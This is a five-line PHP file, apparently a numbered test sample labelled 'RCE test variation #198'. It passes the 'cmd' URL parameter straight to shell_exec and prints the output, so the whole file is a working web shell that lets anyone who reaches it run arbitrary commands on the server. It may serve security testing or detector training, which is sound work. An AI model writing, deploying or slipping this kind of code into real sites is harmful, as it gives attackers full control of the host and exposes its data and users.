<?php
// RCE test variation #198
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>